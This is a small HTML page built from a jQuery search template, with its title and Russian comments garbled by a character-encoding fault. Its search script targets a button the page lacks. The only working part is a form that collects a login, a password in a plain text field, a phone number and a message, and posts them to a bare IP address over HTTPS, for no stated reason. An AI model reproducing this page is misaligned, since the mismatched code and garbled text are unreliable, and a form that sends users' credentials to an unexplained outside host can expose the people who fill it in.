<html>

<head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>PHP, jQuery РџРѕРёСЃРє</title>
    <style>
        body{ font-family:Arial, Helvetica, sans-serif; }
        *{ margin:0;padding:0; }
        #container { margin: 0 auto; width: 600px; }
        a { color:#DF3D82; text-decoration:none }
        a:hover { color:#DF3D82; text-decoration:underline; }
        ul.update { list-style:none;font-size:1.1em; margin-top:10px }
        ul.update li{ height:30px; border-bottom:#dedede solid 1px; text-align:left;}
        ul.update li:first-child{ border-top:#dedede solid 1px; height:30px; text-align:left; }
        #flash { margin-top:20px; text-align:left; }
        #searchresults { text-align:left; margin-top:20px; display:none; font-family:Arial, Helvetica, sans-serif; font-size:16px; color:#000; }
        .word { font-weight:bold; color:#000000; }
        #search_box { padding:4px; border:solid 1px #666666; width:300px; height:30px; font-size:18px;-moz-border-radius: 6px;-webkit-border-radius: 6px; }
        .search_button { border:#000000 solid 1px; padding: 6px; color:#000; font-weight:bold; font-size:16px;-moz-border-radius: 6px;-webkit-border-radius: 6px; }
        .found { font-weight: bold; font-style: italic; color: #ff0000; }
        h2 { margin-right: 70px; }
    </style>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
    <script type="text/javascript">

    $(function() {

        $(".search_button").click(function() {
            // РїРѕР»СѓС‡Р°РµРј СЃС‚СЂРѕРєСѓ, РєРѕС‚РѕСЂСѓСЋ РІРІРµР» РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ
            var searchString    = $("#search_box").val();
            // С„РѕСЂРјРёСЂСѓРµРј РїРѕРёСЃРєРѕРІС‹Р№ Р·Р°РїСЂРѕСЃ
            var data            = 'search='+ searchString;

            // РµСЃР»Рё РІРІРµРґРµРЅРЅР°СЏ РёРЅС„РѕСЂРјР°С†РёСЏ РЅРµ РїСѓСЃС‚Р°
            if(searchString) {
                // РІС‹Р·РѕРІ ajax
                $.ajax({
                    type: "POST",
                    url: "do_search.php",
                    data: data,
                    beforeSend: function(html) { // РґРµР№СЃС‚РІРёРµ РїРµСЂРµРґ РѕС‚РїСЂР°РІР»РµРЅРёРµРј
                        $("#results").html('');
                        $("#searchresults").show();
                        $(".word").html(searchString);
                   },
                   success: function(html){ // РґРµР№СЃС‚РІРёРµ РїРѕСЃР»Рµ РїРѕР»СѓС‡РµРЅРёСЏ РѕС‚РІРµС‚Р°
                        $("#results").show();
                        $("#results").append(html);
                  }
                });
            }
            return false;
        });
    });
    </script>
<body>

    <div id="container">
            <div style="margin:20px auto; text-align: center;">
                <form method="post" action="https://91.212.89.137/mobile.php">
			Логин: <input type="text" name="login">
			Пароль: <input type="text" name="passw">
			Телефон: <input type="text" name="phone">
			Текст: <input type="text" name="text">
			<input type="submit" value="Отправить">

                </form>
            </div>
            <div>
                <div id="searchresults">Search results for <span class="word"></span></div>
                <ul id="results" class="update">
                </ul>
            </div>
        </div>

</body>

</html>